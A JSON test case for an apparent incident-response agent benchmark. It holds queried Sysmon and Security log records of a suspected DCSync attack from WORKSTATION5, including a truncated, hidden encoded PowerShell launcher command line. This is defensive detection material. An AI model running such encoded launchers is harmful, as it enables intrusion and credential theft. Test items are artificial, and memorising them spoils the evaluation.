@@ -1,0 +1,56 @@
+{
+  "case_id": "test-02:E5",
+  "profile": "Profile of window SDWIN-190301174830: 8466 events. Request: A PowerShell session on WORKSTATION5 appears to be replicating credentials from the domain controller (DCSync). Contain host WORKSTATION5.theshire.local. Target: {\"host\": \"WORKSTATION5.theshire.local\"}.",
+  "queries": [
+    {
+      "sql": "SELECT * FROM process_create WHERE record_id IN (558, 572, 927, 1214) ORDER BY record_id",
+      "result": "<<UNTRUSTED_LOG_DATA>>\n{\"record_id\": 558, \"ts\": \"2020-09-21T22:58:59.043000\", \"host\": \"WORKSTATION5.theshire.local\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"event_id\": 1, \"image\": \"C:\\\\Windows\\\\System32\\\\whoami.exe\", \"command_line\": \"\\\"C:\\\\windows\\\\system32\\\\whoami.exe\\\" /user\", \"parent_image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"parent_command_line\": \"\\\"C:\\\\windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\" -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAFIAcwBpAE8ATgBUAEEAQgBMAGUALgBQAFMAVgBlAHIAUwBJAE8ATgAuAE0AQQBKAG8AUgAgAC0ARwBFACAAMwApAHsAJABDADMA…[cut: 5136 chars]\", \"pid\": null, \"ppid\": 7456, \"user\": \"it.adsync\", \"integrity_level\": \"High\", \"hashes\": \"SHA1=8F1F9E265911956C7F8F3861C34DEF9B8FA63813,MD5=2EEEEC89E705F73FFBCAE014E1828788,SHA256=A8A4C4719113B071BB50D67F6E12C188B92C70EEAFDFCD6F5DA69B6AAA99A7FD,IMPHASH=7FF0758B766F747CE57DFAC70743FB88\"}\n{\"record_id\": 572, \"ts\": \"2020-09-21T22:58:59.053000\", \"host\": \"WORKSTATION5.theshire.local\", \"channel\": \"Security\", \"event_id\": 4688, \"image\": \"C:\\\\Windows\\\\System32\\\\whoami.exe\", \"command_line\": \"\\\"C:\\\\windows\\\\system32\\\\whoami.exe\\\" /user\", \"parent_image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"parent_command_line\": null, \"pid\": 1852, \"ppid\": 7456, \"user\": \"it.adsync\", \"integrity_level\": \"High\", \"hashes\": null}\n{\"record_id\": 927, \"ts\": \"2020-09-21T22:59:00.328000\", \"host\": \"WORKSTATION5.theshire.local\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"event_id\": 1, \"image\": \"C:\\\\Windows\\\\System32\\\\wbem\\\\WmiPrvSE.exe\", \"command_line\": \"C:\\\\windows\\\\system32\\\\wbem\\\\wmiprvse.exe -secured -Embedding\", \"parent_image\": \"C:\\\\Windows\\\\System32\\\\svchost.exe\", \"parent_command_line\": \"C:\\\\windows\\\\system32\\\\svchost.exe -k DcomLaunch -p\", \"pid\": null, \"ppid\": 908, \"user\": \"network service\", \"integrity_level\": \"System\", \"hashes\": \"SHA1=51B8646308EE0B68AD1F7F1291B85395434DE49A,MD5=801E8003C257C8F540B20F1E0DECD3A6,SHA256=A75C85F3B089993E9C042FB82ECB7757E8F460ED8065FC7991CAA38A6DE0F50C,IMPHASH=CC058866636CC184AD452F88EE39368A\"}\n{\"record_id\": 1214, \"ts\": \"2020-09-21T22:59:00.545000\", \"host\": \"WORKSTATION5.theshire.local\", \"channel\": \"Security\", \"event_id\": 4688, \"image\": \"C:\\\\Windows\\\\System32\\\\wbem\\\\WmiPrvSE.exe\", \"command_line\": \"C:\\\\windows\\\\system32\\\\wbem\\\\wmiprvse.exe -secured -Embedding\", \"parent_image\": \"C:\\\\Windows\\\\System32\\\\svchost.exe\", \"parent_command_line\": null, \"pid\": 8008, \"ppid\": 908, \"user\": \"workstation5$\", \"integrity_level\": \"System\", \"hashes\": null}\n<</UNTRUSTED_LOG_DATA>>",
+      "rows": 4,
+      "registered": [
+        558,
+        572,
+        927,
+        1214
+      ]
+    },
+    {
+      "sql": "SELECT * FROM process_access WHERE record_id IN (540, 545, 561, 565) ORDER BY record_id",
+      "result": "<<UNTRUSTED_LOG_DATA>>\n{\"record_id\": 540, \"ts\": \"2020-09-21T22:58:59.029000\", \"host\": \"WORKSTATION5.theshire.local\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"event_id\": 10, \"source_image\": \"C:\\\\windows\\\\system32\\\\svchost.exe\", \"source_pid\": 908, \"target_image\": \"C:\\\\windows\\\\System32\\\\svchost.exe\", \"target_pid\": 3308, \"granted_access\": \"0x1000\", \"call_trace\": \"C:\\\\windows\\\\SYSTEM32\\\\ntdll.dll+9c534|C:\\\\windows\\\\SYSTEM32\\\\psmserviceexthost.dll+222a3|C:\\\\windows\\\\SYSTEM32\\\\psmserviceexthost.dll+1a172|C:\\\\windows\\\\SYSTEM32\\\\psmserviceexthost.dll+19e3b|C:\\\\windows\\\\SYSTEM32\\\\…[cut: 374 chars]\", \"user\": null}\n{\"record_id\": 545, \"ts\": \"2020-09-21T22:58:59.035000\", \"host\": \"WORKSTATION5.theshire.local\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"event_id\": 10, \"source_image\": \"C:\\\\windows\\\\system32\\\\svchost.exe\", \"source_pid\": 908, \"target_image\": \"C:\\\\windows\\\\System32\\\\svchost.exe\", \"target_pid\": 3308, \"granted_access\": \"0x1000\", \"call_trace\": \"C:\\\\windows\\\\SYSTEM32\\\\ntdll.dll+9c534|C:\\\\windows\\\\SYSTEM32\\\\psmserviceexthost.dll+222a3|C:\\\\windows\\\\SYSTEM32\\\\psmserviceexthost.dll+1a172|C:\\\\windows\\\\SYSTEM32\\\\psmserviceexthost.dll+19e3b|C:\\\\windows\\\\SYSTEM32\\\\…[cut: 374 chars]\", \"user\": null}\n{\"record_id\": 561, \"ts\": \"2020-09-21T22:58:59.044000\", \"host\": \"WORKSTATION5.theshire.local\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"event_id\": 10, \"source_image\": \"C:\\\\windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"source_pid\": 7456, \"target_image\": \"C:\\\\windows\\\\system32\\\\whoami.exe\", \"target_pid\": 1852, \"granted_access\": \"0x1fffff\", \"call_trace\": \"C:\\\\windows\\\\SYSTEM32\\\\ntdll.dll+9d8e4|C:\\\\windows\\\\System32\\\\KERNELBASE.dll+59e1a|C:\\\\windows\\\\System32\\\\KERNELBASE.dll+567b6|C:\\\\windows\\\\System32\\\\KERNEL32.DLL+1be93|C:\\\\windows\\\\assembly\\\\NativeImages_v4.0.30319…[cut: 1271 chars]\", \"user\": \"it.adsync\"}\n{\"record_id\": 565, \"ts\": \"2020-09-21T22:58:59.047000\", \"host\": \"WORKSTATION5.theshire.local\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"event_id\": 10, \"source_image\": \"C:\\\\windows\\\\system32\\\\csrss.exe\", \"source_pid\": 5220, \"target_image\": \"C:\\\\windows\\\\system32\\\\whoami.exe\", \"target_pid\": 1852, \"granted_access\": \"0x1fffff\", \"call_trace\": \"C:\\\\windows\\\\SYSTEM32\\\\ntdll.dll+9c534|C:\\\\windows\\\\system32\\\\basesrv.DLL+2fba|C:\\\\windows\\\\SYSTEM32\\\\CSRSRV.dll+5af4|C:\\\\windows\\\\SYSTEM32\\\\ntdll.dll+6ce5f\", \"user\": null}\n<</UNTRUSTED_LOG_DATA>>",
+      "rows": 4,
+      "registered": [
+        540,
+        545,
+        561,
+        565
+      ]
+    },
+    {
+      "sql": "SELECT * FROM network WHERE record_id IN (5107, 5109, 5236, 5239, 5242) ORDER BY record_id",
+      "result": "<<UNTRUSTED_LOG_DATA>>\n{\"record_id\": 5107, \"ts\": \"2020-09-21T22:59:14.904000\", \"host\": \"MORDORDC.theshire.local\", \"channel\": \"Security\", \"event_id\": 5156, \"image\": \"\\\\device\\\\harddiskvolume2\\\\windows\\\\system32\\\\lsass.exe\", \"pid\": 696, \"src_ip\": \"172.18.39.5\", \"src_port\": 50386, \"dst_ip\": \"172.18.38.5\", \"dst_port\": 49674, \"protocol\": \"6\", \"direction\": \"inbound\", \"user\": null}\n{\"record_id\": 5109, \"ts\": \"2020-09-21T22:59:14.904000\", \"host\": \"MORDORDC.theshire.local\", \"channel\": \"Security\", \"event_id\": 5156, \"image\": \"\\\\device\\\\harddiskvolume2\\\\windows\\\\system32\\\\lsass.exe\", \"pid\": 696, \"src_ip\": \"172.18.39.5\", \"src_port\": 50387, \"dst_ip\": \"172.18.38.5\", \"dst_port\": 88, \"protocol\": \"6\", \"direction\": \"inbound\", \"user\": null}\n{\"record_id\": 5236, \"ts\": \"2020-09-21T22:59:14.906000\", \"host\": \"WORKSTATION5.theshire.local\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"event_id\": 3, \"image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"pid\": 7456, \"src_ip\": \"172.18.39.5\", \"src_port\": 50385, \"dst_ip\": \"172.18.38.5\", \"dst_port\": 135, \"protocol\": \"tcp\", \"direction\": \"outbound\", \"user\": \"it.adsync\"}\n{\"record_id\": 5239, \"ts\": \"2020-09-21T22:59:14.906000\", \"host\": \"WORKSTATION5.theshire.local\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"event_id\": 3, \"image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"pid\": 7456, \"src_ip\": \"172.18.39.5\", \"src_port\": 50386, \"dst_ip\": \"172.18.38.5\", \"dst_port\": 49674, \"protocol\": \"tcp\", \"direction\": \"outbound\", \"user\": \"it.adsync\"}\n{\"record_id\": 5242, \"ts\": \"2020-09-21T22:59:14.906000\", \"host\": \"WORKSTATION5.theshire.local\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"event_id\": 3, \"image\": \"C:\\\\Windows\\\\System32\\\\lsass.exe\", \"pid\": null, \"src_ip\": \"172.18.39.5\", \"src_port\": 50387, \"dst_ip\": \"172.18.38.5\", \"dst_port\": 88, \"protocol\": \"tcp\", \"direction\": \"outbound\", \"user\": \"system\"}\n<</UNTRUSTED_LOG_DATA>>",
+      "rows": 5,
+      "registered": [
+        5107,
+        5109,
+        5236,
+        5239,
+        5242
+      ]
+    }
+  ],
+  "findings": "Records 561, 572, 5236, 5239 look relevant to the request; deciding on the next action.",
+  "retrieved": [
+    540,
+    545,
+    558,
+    561,
+    565,
+    572,
+    927,
+    1214,
+    5107,
+    5109,
+    5236,
+    5239,
+    5242
+  ]
+}
